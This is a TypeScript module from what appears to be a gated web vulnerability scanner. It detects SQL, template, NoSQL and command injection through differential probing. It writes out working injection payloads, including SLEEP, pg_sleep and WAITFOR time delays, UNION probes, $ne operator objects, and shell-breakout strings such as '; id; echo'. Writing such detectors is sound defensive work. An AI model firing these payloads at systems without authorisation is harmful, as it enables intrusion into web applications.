// Probe family module — implementation moved verbatim from surface-engine.ts (no behavior change).
import { randomInt } from 'node:crypto'
import { BrokerApprovalRequired, BrokerDenied } from '.././broker.ts'
import type { BrokerExchangeResult, Grant } from '.././broker.ts'
import { dbErrorDialect, injectParam, randToken, responseSimilarity } from './context.ts'
import type { DiffContext, DiffOutcome, SurfaceParamLocation } from './context.ts'
import type { ProbeModule } from './registry.ts'



export function isPrime(n: number): boolean {
  if (n < 2) return false
  if (n % 2 === 0) return n === 2
  for (let i = 3; i * i <= n; i += 2) if (n % i === 0) return false
  return true
}



export function randomPrime(min: number, max: number, exclude?: number): number {
  for (;;) {
    const c = randomInt(min, max) | 1
    if (c !== exclude && isPrime(c)) return c
  }
}



export const templateSyntaxes: Array<{ engine: string; format: (a: number, b: number) => string }> = [
  { engine: 'jinja2/twig', format: (a, b) => `{{${a}*${b}}}` },
  { engine: 'erb', format: (a, b) => `<%=${a}*${b}%>` },
  { engine: 'freemarker/el', format: (a, b) => '${' + `${a}*${b}` + '}' },
  { engine: 'spel/pebble', format: (a, b) => `#{${a}*${b}}` },
  { engine: 'thymeleaf', format: (a, b) => '[[${' + `${a}*${b}` + '}]]' },
]



export async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseValue = req.baselineValue ?? '1'
  const baseA = await send(injectParam(req, baseValue))
  const baseB = await send(injectParam(req, baseValue))
  if (!baseA || !baseB) return { verdict: 'inconclusive', summary: 'Baseline requests failed.', details: {} }

  const baselineDialect = dbErrorDialect(baseA.body)
  let detectedErrorDialect: string | null = null
  let consecutive5xx = 0
  let total5xx = 0

  const checkDbError = (ex: BrokerExchangeResult | null) => {
    if (!ex) return
    if (ex.status >= 500) {
      consecutive5xx += 1
      total5xx += 1
    } else {
      consecutive5xx = 0
    }
    const d = dbErrorDialect(ex.body)
    if (d && d !== baselineDialect && !detectedErrorDialect) {
      detectedErrorDialect = d
      anomalies.push({ type: 'db_error_fingerprint', dialect: d })
    }
  }

  // Expanded 9-pattern boolean/syntax matrix. LIKE-wrapped sinks are common (search boxes), so the
  // `%` breakout runs early; the remaining shapes are only worth their requests when the response
  // has already shown it reacts to syntax.
  const styles: Array<{ name: string; orBranch?: boolean; make: (k: number, truth: boolean) => string }> = [
    { name: 'single_quote', make: (k, t) => `${baseValue}' AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'single_paren', make: (k, t) => `${baseValue}') AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'like_breakout', make: (k, t) => `${baseValue}%' AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'or_branch', orBranch: true, make: (k, t) => `${baseValue}' OR ${k}=${t ? k : k + 1}-- -` },
    { name: 'numeric', make: (k, t) => `${baseValue} AND ${k}=${t ? k : k + 1}` },
    { name: 'double_quote', make: (k, t) => `${baseValue}" AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'single_double_paren', make: (k, t) => `${baseValue}')) AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'order_by', make: (k, t) => `${baseValue} ORDER BY (CASE WHEN (${k}=${t ? k : k + 1}) THEN 1 ELSE 2 END)-- -` },
  ]
  const signals: Array<Record<string, unknown>> = []
  let divergentStyles = 0
  let stylesRun = 0
  for (const style of styles) {
    if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) break
    // A parameter the app ignores answers every probe with the byte-identical baseline. Four shapes
    // (including the OR branch, which proves non-LIKE sinks without a baseline) are enough evidence.
    if (stylesRun >= 4 && divergentStyles === 0) break
    stylesRun += 1
    const rounds: Array<Record<string, unknown>> = []
    let pass = true
    for (let r = 0; r < 2; r += 1) {
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
      const k = randomInt(1000, 9999)
      const tVal = style.make(k, true)
      const fVal = style.make(k, false)
      const t = await send(injectParam(req, tVal))
      checkDbError(t)
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
      const f = await send(injectParam(req, fVal))
      checkDbError(f)
      if (!t || !f) { pass = false; break }
      // JSON sinks often echo the query back. Scrub the injected payload and the baseline value from
      // both sides so the comparison reflects the returned data, not the echo of differing inputs.
      const scrub = (body: string, values: string[]): string => {
        let s = body
        for (const v of values) if (v) s = s.split(v).join('\u0000')
        return s
      }
      const simBaseTrue = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(t.body, [tVal, baseValue]))
      const simBaseFalse = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(f.body, [fVal, baseValue]))
      const simTrueFalse = responseSimilarity(scrub(t.body, [tVal, baseValue]), scrub(f.body, [fVal, baseValue]))
      const statusDiverges = t.status === baseA.status && f.status !== t.status && f.status < 500
      if (simBaseTrue < 0.98 || simBaseFalse < 0.98 || t.status !== baseA.status || f.status !== baseA.status) divergentStyles += 1
      const roundPass = style.orBranch
        ? (t.status < 500 && f.status < 500 && Math.max(simBaseTrue, simBaseFalse) >= 0.9 && (simTrueFalse <= 0.75 || statusDiverges))
        : (t.status < 500 && f.status < 500 && simBaseTrue >= 0.9 && (simTrueFalse <= 0.75 || statusDiverges))
      rounds.push({ k, statusBase: baseA.status, statusTrue: t.status, statusFalse: f.status, simBaseTrue, simTrueFalse, roundPass })
      if (!roundPass) { pass = false; break }
    }
    const passed = pass && rounds.length === 2
    signals.push({ style: style.name, passed, rounds })
    if (passed) break
  }

  let unionSignal: Record<string, unknown> | null = null
  const interesting = divergentStyles > 0 || Boolean(detectedErrorDialect)
  if (!signals.some(s => s.passed) && interesting && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2)) {
    const unionResults: Array<{ cols: number; status: number; simToBase: number }> = []
    for (const cols of [1, 2, 3]) {
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) break
      const nulls = Array.from({ length: cols }, () => 'NULL').join(',')
      const ex = await send(injectParam(req, `${baseValue}' UNION SELECT ${nulls}-- -`))
      checkDbError(ex)
      if (!ex) continue
      unionResults.push({ cols, status: ex.status, simToBase: responseSimilarity(baseA.body, ex.body) })
    }
    const ok2xx = unionResults.filter(u => u.status >= 200 && u.status < 300)
    const errNon5xx = unionResults.filter(u => u.status >= 400 && u.status < 500)
    if (ok2xx.length === 1 && (errNon5xx.length >= 1 || unionResults.some(u => u.simToBase <= 0.75))) {
      unionSignal = { style: 'union_null', passed: true, columns: ok2xx[0].cols, results: unionResults }
      signals.push(unionSignal)
    } else if (unionResults.length > 0) {
      signals.push({ style: 'union_null', passed: false, results: unionResults })
    }
  }

  // A lone quote is the cheapest error-fingerprint probe; keep it even when no style diverged.
  const quoteOne = (consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
    ? await send(injectParam(req, `${baseValue}'`))
    : null
  checkDbError(quoteOne)
  const quoteTwo = (quoteOne && (interesting || Boolean(detectedErrorDialect)) && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
    ? await send(injectParam(req, `${baseValue}''`))
    : null
  checkDbError(quoteTwo)

  const errorDialect = detectedErrorDialect ?? (quoteOne ? dbErrorDialect(quoteOne.body) : null)
  const details: Record<string, unknown> = {
    baselineStable: baseA.bodySha256 === baseB.bodySha256 || responseSimilarity(baseA.body, baseB.body) >= 0.98,
    booleanSignals: signals,
    dbErrorDialect: errorDialect && errorDialect !== baselineDialect ? errorDialect : null,
    quoteDelta: quoteOne && quoteTwo
      ? { singleStatus: quoteOne.status, pairedStatus: quoteTwo.status, similarity: responseSimilarity(quoteOne.body, quoteTwo.body) }
      : null,
  }
  const passed = signals.find(s => s.passed)
  let summary = 'No boolean or error differential observed.'
  let verdict: DiffOutcome['verdict'] = 'no_signal'
  if (passed) {
    verdict = 'signal'
    summary = `Boolean differential (${String(passed.style)}) held across randomized rounds: equal-comparison matches baseline, unequal-comparison diverges.`
    anomalies.push({ type: 'boolean_differential', style: passed.style, rounds: passed.rounds ?? passed.results })
  }
  if (details.dbErrorDialect) {
    verdict = 'signal'
    summary = `${passed ? summary + ' ' : ''}${String(details.dbErrorDialect)} database error fingerprint on SQL syntax probe.`
    if (!anomalies.some(a => a.type === 'db_error_fingerprint')) {
      anomalies.push({ type: 'db_error_fingerprint', dialect: details.dbErrorDialect })
    }
  }
  return { verdict, summary, details }
}



export function medianOf(nums: readonly number[]): number {
  if (nums.length === 0) return 0
  const sorted = [...nums].sort((a, b) => a - b)
  const mid = Math.floor(sorted.length / 2)
  return sorted.length % 2 === 1 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2
}



export async function diffSqlTimeDifferential(ctx: DiffContext, grant: Grant): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
  const tier = grant.tier ?? 1
  const location: SurfaceParamLocation = req.paramLocation ?? (req.method && req.method !== 'GET' ? 'json' : 'query')
  const method = req.method ?? (['json', 'form', 'xml', 'graphql_var'].includes(location) ? 'POST' : 'GET')

  if (!localLab) {
    if (tier < 3) {
      throw new BrokerDenied('sqli_time_diff is blocked on public projects below Tier 3 (requires local-lab or explicit Tier-3 HITL approval).')
    }
    if (!(grant.isStateChangeApproved?.(ctx.origin, method, req.pathAndQuery) ?? false)) {
      throw new BrokerApprovalRequired(ctx.origin, method, req.pathAndQuery)
    }
  }

  const delayMs = Math.max(1500, Math.min(3000, Math.round(req.delayMs ?? 1500)))
  const delaySec = Number((delayMs / 1000).toFixed(2))
  const delaySecInt = Math.max(1, Math.round(delayMs / 1000))
  const baseValue = req.baselineValue ?? '1'

  const sqliteDelay = Math.min(90_000_000, delayMs * 25_000)
  const allCandidates: Array<{ dialect: 'mysql' | 'postgres' | 'mssql' | 'sqlite'; style: string; payload: string }> = [
    { dialect: 'mysql', style: 'numeric', payload: `${baseValue} AND SLEEP(${delaySec})` },
    { dialect: 'mysql', style: 'single_quote', payload: `${baseValue}' AND SLEEP(${delaySec})-- -` },
    { dialect: 'postgres', style: 'single_quote', payload: `${baseValue}' AND (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL-- -` },
    { dialect: 'postgres', style: 'numeric', payload: `${baseValue} AND (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL` },
    { dialect: 'mssql', style: 'single_quote', payload: `${baseValue}'; WAITFOR DELAY '0:0:${delaySecInt}'-- -` },
    { dialect: 'sqlite', style: 'single_quote', payload: `${baseValue}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sqliteDelay}))))-- -` },
    // OR-branch variants keep the delay expression reachable when the left comparison is false (a
    // blind query often filters on a value the caller's own baseline does not match).
    { dialect: 'mysql', style: 'or_branch', payload: `${baseValue}' OR SLEEP(${delaySec})-- -` },
    { dialect: 'postgres', style: 'or_branch', payload: `${baseValue}' OR (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL-- -` },
    { dialect: 'sqlite', style: 'or_branch', payload: `${baseValue}' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sqliteDelay}))))-- -` },
  ]
  const candidates = req.dialect
    ? [
        ...allCandidates.filter(c => c.dialect === req.dialect),
        ...allCandidates.filter(c => c.dialect !== req.dialect),
      ]
    : allCandidates

  const candidateSummaries: Array<Record<string, unknown>> = []
  for (const cand of candidates) {
    const b1 = await send(injectParam(req, baseValue))
    const p1 = await send(injectParam(req, cand.payload))
    if (!b1 || !p1) continue
    if (b1.status >= 500 || p1.status >= 500) continue
    if (p1.durationMs - b1.durationMs < 0.7 * delayMs) {
      candidateSummaries.push({ dialect: cand.dialect, style: cand.style, round1DeltaMs: p1.durationMs - b1.durationMs, passed: false })
      continue
    }
    const b2 = await send(injectParam(req, baseValue))
    const p2 = await send(injectParam(req, cand.payload))
    const b3 = await send(injectParam(req, baseValue))
    const p3 = await send(injectParam(req, cand.payload))
    if (!b2 || !p2 || !b3 || !p3) continue
    const baseDurations = [b1.durationMs, b2.durationMs, b3.durationMs]
    const probeDurations = [p1.durationMs, p2.durationMs, p3.durationMs]
    const statusesOk = [b1, p1, b2, p2, b3, p3].every(e => e.status < 500)
    const baselineMedianMs = medianOf(baseDurations)
    const probeMedianMs = medianOf(probeDurations)
    const minProbeMs = Math.min(...probeDurations)
    const maxBaselineMs = Math.max(...baseDurations)
    const nonOverlapping = minProbeMs > maxBaselineMs
    const deltaOk = probeMedianMs - baselineMedianMs >= 0.85 * delayMs
    const passed = statusesOk && nonOverlapping && deltaOk
    const summaryRow = {
      dialect: cand.dialect,
      style: cand.style,
      delayMs,
      baselineMedianMs,
      probeMedianMs,
      minProbeMs,
      maxBaselineMs,
      nonOverlapping,
      passed,
    }
    candidateSummaries.push(summaryRow)
    if (passed) {
      anomalies.push({ type: 'sql_time_differential', ...summaryRow })
      return {
        verdict: 'signal',
        summary: `Non-overlapping time-based SQL differential (${cand.dialect}/${cand.style}) held across 3 interleaved rounds (probe median ${probeMedianMs}ms vs baseline ${baselineMedianMs}ms).`,
        details: { ...summaryRow, suggestedReplayKind: 'sql_time_diff', candidates: candidateSummaries },
      }
    }
  }

  return {
    verdict: 'no_signal',
    summary: 'No non-overlapping time-based SQL differential observed across 3 rounds.',
    details: { delayMs, suggestedReplayKind: 'sql_time_diff', candidates: candidateSummaries },
  }
}



export async function diffTemplateMath(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseValue = req.baselineValue ?? 'guardianbase'
  const base = await send(injectParam(req, baseValue))
  if (!base) return { verdict: 'inconclusive', summary: 'Baseline request failed.', details: {} }
  const results: Array<Record<string, unknown>> = []
  for (const syntax of templateSyntaxes) {
    const a = randomPrime(101, 997)
    const b = randomPrime(101, 997, a)
    const expression = syntax.format(a, b)
    const product = String(a * b)
    const ex = await send(injectParam(req, `g${randToken(3)}${expression}g${randToken(3)}`))
    if (!ex) continue
    const evaluated = ex.body.includes(product) && !base.body.includes(product)
    const literalReflected = ex.body.includes(expression)
    results.push({ engine: syntax.engine, expression, product, evaluated, literalReflected, status: ex.status })
    if (evaluated) anomalies.push({ type: 'expression_evaluated', engine: syntax.engine, expression, product, literalReflected })
  }
  const hit = results.find(r => r.evaluated)
  return {
    verdict: hit ? 'signal' : 'no_signal',
    summary: hit
      ? `Server evaluated a randomized arithmetic expression (${String(hit.engine)} syntax); product ${String(hit.product)} appeared only in the probe response.`
      : 'No template expression was evaluated.',
    details: { results },
  }
}



export function countRecords(body: string): number | null {
  try {
    const parsed = JSON.parse(body) as unknown
    if (Array.isArray(parsed)) return parsed.length
    if (parsed && typeof parsed === 'object') {
      for (const value of Object.values(parsed as Record<string, unknown>)) if (Array.isArray(value)) return value.length
    }
  } catch { /* not JSON */ }
  return null
}



export async function diffOperatorTypes(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const marker = `gn${randToken(8)}`
  const base = await send(injectParam(req, marker))
  const neutral = await send(injectParam(req, { gx: marker }))
  const variants: Array<{ name: string; value: Record<string, unknown> }> = [
    { name: 'ne', value: { $ne: marker } },
    { name: 'gt_empty', value: { $gt: '' } },
  ]
  if (!base || !neutral) return { verdict: 'inconclusive', summary: 'Baseline requests failed.', details: {} }
  const results: Array<Record<string, unknown>> = []
  const neutralMatchesBase = neutral.status === base.status && responseSimilarity(base.body, neutral.body) >= 0.9
  for (const variant of variants) {
    const ex = await send(injectParam(req, variant.value))
    if (!ex) continue
    const diverges = ex.status !== base.status || responseSimilarity(base.body, ex.body) < 0.75
    results.push({
      operator: variant.name, status: ex.status, baseStatus: base.status,
      similarityToBaseline: responseSimilarity(base.body, ex.body),
      baseRecords: countRecords(base.body), probeRecords: countRecords(ex.body), diverges,
    })
    if (diverges && neutralMatchesBase && ex.status < 500) {
      anomalies.push({ type: 'operator_type_divergence', operator: variant.name, status: ex.status, neutralMatchesBase: true })
    }
  }
  const hit = results.some(r => r.diverges) && neutralMatchesBase
  return {
    verdict: hit ? 'signal' : 'no_signal',
    summary: hit
      ? 'Query-operator objects changed the response while a neutral object control matched the baseline.'
      : 'Operator-typed values did not change the response relative to the controls.',
    details: { neutralMatchesBase, results },
  }
}



/**
 * Command-injection nonce oracle. Injects semicolon/subshell/pipe/backtick echo variants into a
 * parameter that plausibly reaches a shell (host/ip/name/path/cmd/diagnostic endpoints). Execution
 * is proven only when the fresh nonce appears in the response while the sent template does not
 * (which rules out plain input reflection).
 */
export async function diffCommandInjection(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseValue = req.baselineValue ?? (req.paramLocation === 'path' ? '1' : '127.0.0.1')
  const base = await send(injectParam(req, baseValue))
  if (!base) return { verdict: 'inconclusive', summary: 'Baseline request failed.', details: {} }
  const nonce = `gn${randToken(10)}`
  const variants: Array<{ name: string; build: (n: string) => string }> = [
    { name: 'semicolon_echo', build: n => `${baseValue}; echo ${n}` },
    { name: 'subshell_echo', build: n => `${baseValue}$(echo ${n})` },
    { name: 'quote_break', build: n => `${baseValue}"; echo ${n}; "` },
    { name: 'quote_break_id', build: n => `${baseValue}"; id; echo ${n}; "` },
    { name: 'pipe_echo', build: n => `${baseValue} | echo ${n}` },
    { name: 'backtick_echo', build: n => `${baseValue}\`echo ${n}\`` },
  ]
  const results: Array<Record<string, unknown>> = []
  for (const variant of variants) {
    const payload = variant.build(nonce)
    const ex = await send(injectParam(req, payload))
    if (!ex) continue
    const nonceInBody = ex.body.includes(nonce)
    const templateReflected = ex.body.includes(payload)
    const executed = nonceInBody && !templateReflected
    results.push({ variant: variant.name, status: ex.status, nonceInBody, templateReflected, executed })
    if (executed) {
      anomalies.push({
        type: 'command_executed', variant: variant.name, baseValue, nonce, payload,
        status: ex.status, suggestedReplayKind: 'rce_proof',
      })
      return {
        verdict: 'signal',
        summary: `Fresh shell nonce appeared in output for the ${variant.name} variant without template reflection (command executed).`,
        details: { results, baseStatus: base.status, suggestedReplayKind: 'rce_proof' },
      }
    }
  }
  return {
    verdict: 'no_signal',
    summary: 'No command-execution nonce appeared in output across echo variants.',
    details: { results, baseStatus: base.status },
  }
}

export const injectionProbe: ProbeModule = {
  family: 'injection',
  classes: ['sqli_boolean', 'sqli_time_diff', 'ssti_math', 'nosqli_type', 'command_injection'],
  run: (ctx, deps) => {
    switch (ctx.req.probeClass) {
      case 'sqli_boolean': return diffBooleanDifferential(ctx)
      case 'sqli_time_diff': return diffSqlTimeDifferential(ctx, deps.grant)
      case 'ssti_math': return diffTemplateMath(ctx)
      case 'nosqli_type': return diffOperatorTypes(ctx)
      case 'command_injection': return diffCommandInjection(ctx)
      default: return Promise.resolve({ verdict: 'inconclusive', summary: 'Probe class not owned by injection module.', details: {} })
    }
  },
}
